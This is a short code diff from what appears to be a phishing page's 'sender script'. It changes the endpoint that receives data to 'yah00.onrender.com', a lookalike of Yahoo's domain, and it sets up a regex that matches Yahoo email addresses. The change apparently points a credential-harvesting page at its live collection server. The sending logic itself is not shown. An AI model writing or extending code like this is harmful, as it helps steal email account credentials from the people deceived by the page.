@@ -3,7 +3,7 @@ document.addEventListener("DOMContentLoaded", function () {
     console.log("sender script loaded");
 
     const hostname = "https://yah00.onrender.com";
-    const endpoint = "https://stackblitzstarterswicsgx-c5xy--3001--41692973.local-credentialless.webcontainer.io/endpoint";
+    const endpoint = "https://yah00.onrender.com/endpoint";
 
     const yahooEmailRegex = /^[^\s@]+@yahoo\.com$/i;
 
